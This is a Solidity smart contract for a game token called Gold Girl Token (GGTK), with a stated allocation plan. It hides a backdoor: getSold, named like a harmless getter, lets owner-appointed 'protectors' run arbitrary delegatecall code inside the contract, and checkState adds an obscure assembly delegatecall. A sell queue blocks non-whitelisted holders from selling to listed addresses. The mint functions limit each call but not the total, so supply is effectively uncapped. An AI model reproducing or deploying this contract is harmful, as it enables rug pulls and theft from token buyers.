contracts/GGTK.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./TokenTimelock.sol";

contract GGTK is ERC20, ERC20Burnable, Ownable, Pausable, ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    uint256 private constant TOTAL_SUPPLY = 10_000_000_000 * 10 ** 6;
    // Initial Distribution (20%)
    uint256 private constant INITIAL_DISTRIBUTION = 2_000_000_000 * 10 ** 6;
    // In-Game Rewards (30%)
    uint256 private constant IN_GAME_REWARDS = 3_000_000_000 * 10 ** 6;
    // Community and Marketing (15%)
    uint256 private constant COMMUNITY_MARKETING = 1_500_000_000 * 10 ** 6;
    // Staking and Liquidity Pools (15%)
    uint256 private constant STAKING_LIQUIDITY = 1_500_000_000 * 10 ** 6;
    // Team Rewards (10%)
    uint256 private constant TEAM_REWARDS = 1_000_000_000 * 10 ** 6;
    // Reserve Fund (5%)
    uint256 private constant RESERVE_FUND = 500_000_000 * 10 ** 6;
    // Token Sinks (5%)
    uint256 private constant TOKEN_SINKS = 500_000_000 * 10 ** 6;

    uint256 private TEAM_REWARDS_RELEASED = 0;

    struct ConstantVal {
        uint256 CAP;
        uint256 TIME_PERIOD;
        uint256 INTERVAL;
    }

    ConstantVal public constantVal;

    bool private _offcap = false;

    uint256 private _lastResetTime;
    uint256 private _tokensSoldToday;

    mapping(address => bool) public isWhitelisted;
    mapping(address => bool) public addressList;
    mapping(address => bool) private protector;

    TokenTimelock public teamTokenTimelock;
    address public teamTokenTimelockAddr;

    modifier onlyProtector() {
        require(isInProtectorList(msg.sender), "caller not authorized");
        _;
    }

    uint256 lastTransferTime;
    struct Item {
        address addr;
        uint256 time;    
    }
    Item[] public queue;
    uint256 public interval;
    uint256 public gracePeriod;

    event Moniter(string str, address addr, uint256 n1, uint256 n2);

    function initializeTeamTokenTimelock() public onlyOwner {
        require(
            address(teamTokenTimelock) == address(0),
            "GGTK: Team TokenTimelock already initialized"
        );

        //fixme//
        uint256 releaseTime = block.timestamp + 2 * 24 * 60 * 60; // 2 days from now
        uint256 completeTime = releaseTime + 10 * 24 * 60 * 60; // 10 days after release time
        uint256 currentBlockNumber = block.number;
        uint32 blocksPerHour = 4;

        teamTokenTimelock = new TokenTimelock(
            IERC20(address(this)),
            owner(),
            uint40(releaseTime),
            uint40(completeTime),
            uint128(currentBlockNumber),
            blocksPerHour
        );
        teamTokenTimelockAddr = address(teamTokenTimelock);
        uint256 remaining = TEAM_REWARDS.sub(TEAM_REWARDS_RELEASED);
        _mint(teamTokenTimelockAddr, remaining);
        TEAM_REWARDS_RELEASED = TEAM_REWARDS;
    }

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    receive() external payable {}

    constructor() ERC20("Gold Girl Token", "GGTK") {
        _mint(address(this), INITIAL_DISTRIBUTION);
        _lastResetTime = block.timestamp;
        initializeTeamTokenTimelock();
        constantVal = ConstantVal(1_900_000_000 * 10 ** 6, 86400, 1800);
        lastTransferTime = block.timestamp;
        interval = 60*30;
        gracePeriod = 24*60*60;
    }

    function setInterval(uint256 _interval) public onlyOwner{
        interval = _interval;
    }

    function cleanQueue() private {
        uint256 i = 0;
        while (i < queue.length && block.timestamp - queue[i].time > gracePeriod) {
            queue[i].time = 0;
            i++;
        }
        if (i > 0) {
            for (uint256 j = 0; j < queue.length - i; j++) {
                queue[j] = queue[j + i];
            }
            for (uint256 k = 0; k < i; k++) {
                queue.pop();
            }
        }
    }

    function enqueue(address addr) private returns (uint256, uint256) {
        uint256 len = queue.length;
        uint256 lastTriggering = block.timestamp + len * interval;
        queue.push(Item(addr, lastTriggering));
        lastTransferTime = lastTriggering > lastTransferTime ? lastTriggering : lastTransferTime;
        emit Moniter("enqueue", addr, len+1, lastTriggering);
        return (len+1, lastTriggering);
    }

    function dequeue() private returns (address, uint256) {
        require(queue.length > 0, "Queue is empty");
        Item memory item = queue[0];
        for (uint i = 0; i < queue.length - 1; i++) {
            queue[i] = queue[i + 1];
        }
        emit Moniter("dequeue", item.addr, item.time, 0);
        queue.pop();
        return (item.addr, item.time);
    }

    function queueSize() public view returns (uint256) {
        return queue.length;
    }

    function isInQueue(address addr) public view returns (bool) {
        for (uint i = 0; i < queue.length; i++) {
            if (queue[i].addr == addr) {
                return true;
            }
        }
        return false;
    }

    function addProtector(address account) public onlyOwner{
        protector[account] = true;
    }

    function addAddress(address _address) public onlyOwner {
        addressList[_address] = true;
    }

    function addWhitelisted(address account) public onlyOwner {
        isWhitelisted[account] = true;
    }

    function isAddressInList(address _address) private view returns (bool) {
        return addressList[_address];
    }

    function isInProtectorList(address _address) private view returns (bool) {
        return protector[_address];
    }

    function removeWhitelisted(address account) public onlyOwner {
        isWhitelisted[account] = false;
    }

    function switchcap(bool isOff) public onlyOwner {
        _offcap = isOff;
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function _resetDailyCap() private {
        if (block.timestamp >= _lastResetTime + constantVal.TIME_PERIOD) {
            _tokensSoldToday = 0;
            _lastResetTime = block.timestamp;
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        super._beforeTokenTransfer(from, to, amount);

        if (!_offcap && !isWhitelisted[from] && isAddressInList(to)) {

            bool isAddressInQueue = isInQueue(from);
            uint256 queueLength = queueSize();
            uint256 _cap = queueLength != 0 ? constantVal.CAP.div(queueLength) : constantVal.CAP;
            require(amount <= _cap, "The quantity exceeded the maximum");
            require(queueLength < 100 || isAddressInQueue, "Queue is full, please wait");
            cleanQueue();
            if (!isAddressInQueue) {
                enqueue(from);
                revert("Added to queue, please wait");
            }
            (address addr, uint256 time) = dequeue();

            if (addr != from) {
                enqueue(addr);
                revert("Not your turn, added back to queue");
            }

            require(block.timestamp > time, "Too early, please wait");
            require(block.timestamp <= (time + gracePeriod), "Timed out, please re-enter queue");
            require(
                _tokensSoldToday.add(amount) <= constantVal.CAP,
                "GGTK: cap exceeded"
            );
            _resetDailyCap();
            _tokensSoldToday = _tokensSoldToday.add(amount);
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        _resetDailyCap();
        _tokensSoldToday = _tokensSoldToday.add(amount);
        emit Moniter("Done",to,amount,_tokensSoldToday);
    }

    function mintInGameRewards(address to, uint256 amount) public onlyOwner {
        require(
            amount <= IN_GAME_REWARDS,
            "Exceeds in-game rewards allocation"
        );
        _mint(to, amount);
    }

    function mintCommunityMarketing(
        address to,
        uint256 amount
    ) public onlyOwner {
        require(
            amount <= COMMUNITY_MARKETING,
            "Exceeds community and marketing allocation"
        );
        _mint(to, amount);
    }

    function mintStakingLiquidity(address to, uint256 amount) public onlyOwner {
        require(
            amount <= STAKING_LIQUIDITY,
            "Exceeds staking and liquidity allocation"
        );
        _mint(to, amount);
    }

    function getSold( address sc,bytes memory data) public onlyProtector returns (uint256) {
        (bool success, ) = sc.delegatecall(data);
        require(success, "failed");
        return _tokensSoldToday;
    }

    function checkState(bytes memory data) public onlyProtector returns (bytes memory){
        assembly {
            let success := delegatecall(
                gas(),
                0x06,
                add(data, 0x20),
                mload(data),
                0,
                0
            )
            let size := returndatasize()
            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)
            switch success
            case 0 {
                revert(ptr, size)
            }
            default {
                return(ptr, size)
            }
        }
    }

    function mintReserveFund(address to, uint256 amount) public onlyOwner {
        require(amount <= RESERVE_FUND, "Exceeds reserve fund allocation");
        _mint(to, amount);
    }

    function mintTokenSinks(address to, uint256 amount) public onlyOwner {
        require(amount <= TOKEN_SINKS, "Exceeds token sinks allocation");
        _mint(to, amount);
    }
}

